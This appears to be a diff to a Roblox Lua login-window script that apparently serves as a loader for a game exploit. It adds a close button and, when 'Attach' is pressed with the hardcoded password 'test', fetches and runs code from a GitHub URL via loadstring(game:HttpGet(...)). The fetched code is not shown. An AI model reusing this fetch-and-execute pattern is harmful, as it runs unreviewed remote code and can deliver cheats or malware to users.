@@ -1,4 +1,4 @@
-
+-- Instances:
 
 local login = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
@@ -20,6 +20,8 @@ local _2 = Instance.new("Frame")
 local UICorner_5 = Instance.new("UICorner")
 local _3 = Instance.new("Frame")
 local UICorner_6 = Instance.new("UICorner")
+local X = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
 
 --Properties:
 
@@ -130,14 +132,34 @@ _3.Size = UDim2.new(0, 40, 0, 42)
 UICorner_6.CornerRadius = UDim.new(0.100000001, 0)
 UICorner_6.Parent = _3
 
+X.Name = "X"
+X.Parent = main
+X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+X.BackgroundTransparency = 1.000
+X.Position = UDim2.new(0.99333334, 0, -0.0346153863, 0)
+X.Size = UDim2.new(0, 26, 0, 27)
+X.Font = Enum.Font.SourceSans
+X.Text = "X"
+X.TextColor3 = Color3.fromRGB(255, 154, 65)
+X.TextScaled = true
+X.TextSize = 14.000
+X.TextWrapped = true
+
+UICorner_7.CornerRadius = UDim.new(0.100000001, 0)
+UICorner_7.Parent = X
+
 frame = main
 frame.Draggable = true
 frame.Active = true
 frame.Selectable = true
 
+X.MouseButton1Down:connect(function()
+        login.Enabled = false
+end)
+
 Attach.MouseButton1Down:connect(function()
- if password.Text == test then
-  login.Enabled = false
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Skiboot007/-e-/main/(e).luau"))()
- end
+    if password.Text == "test" then
+        login.Enabled = false
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skiboot007/-e-/main/(e).luau"))()
+    end
 end)
